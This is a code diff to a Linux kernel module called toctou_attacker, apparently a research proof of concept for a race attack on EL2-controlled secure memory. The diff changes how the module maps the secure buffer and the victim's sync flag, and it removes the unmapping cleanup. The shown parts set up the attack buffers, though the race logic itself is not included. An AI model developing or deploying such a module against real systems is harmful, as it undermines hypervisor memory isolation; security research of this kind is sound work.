@@ -152,9 +152,8 @@ static int __init toctou_attacker_init(void)
     sync_flag_base = (void __iomem *)phys_to_virt(exported_sync_phys);
     pr_info("[ATTACKER] Using victim's sync at phys=0x%lx\n", exported_sync_phys);
 
-    /* Map secure buffer region (this is EL2-controlled memory) */
-    secure_buffer_base = ioremap(SECURE_BUFFER_BASE_PHYS,
-                                  SECURE_BUFFER_SIZE_PER_CORE * NUM_CORES);
+    /* Map secure buffer region using phys_to_virt (RAM region, not MMIO) */
+    secure_buffer_base = (void __iomem *)phys_to_virt(SECURE_BUFFER_BASE_PHYS);
     if (!secure_buffer_base) {
         pr_err("[ATTACKER] Failed to map secure buffer\n");
         return -ENOMEM;
@@ -164,7 +163,7 @@ static int __init toctou_attacker_init(void)
     attack_src_buf = (void *)__get_free_page(GFP_KERNEL | GFP_DMA);
     if (!attack_src_buf) {
         pr_err("[ATTACKER] Failed to allocate attack buffer\n");
-        goto err_unmap_secure;
+        return -ENOMEM;
     }
     attack_src_dma = virt_to_phys(attack_src_buf);
     
@@ -188,10 +187,6 @@ static int __init toctou_attacker_init(void)
     pr_info("[ATTACKER] Loaded: auto=%d, sync=0x%lx, verify=0x%lx\n",
             auto_start, exported_sync_phys, exported_verify_phys);
     return 0;
-
-err_unmap_secure:
-    iounmap(secure_buffer_base);
-    return -ENOMEM;
 }
 
 static void __exit toctou_attacker_exit(void)
@@ -204,10 +199,7 @@ static void __exit toctou_attacker_exit(void)
     if (attack_src_buf)
         free_page((unsigned long)attack_src_buf);
 
-    if (secure_buffer_base)
-        iounmap(secure_buffer_base);
-
-    /* sync_flag_base is mapped via phys_to_virt, no iounmap needed */
+    /* secure_buffer_base and sync_flag_base use phys_to_virt, no iounmap needed */
 
     pr_info("[ATTACKER] Unloaded\n");
 }
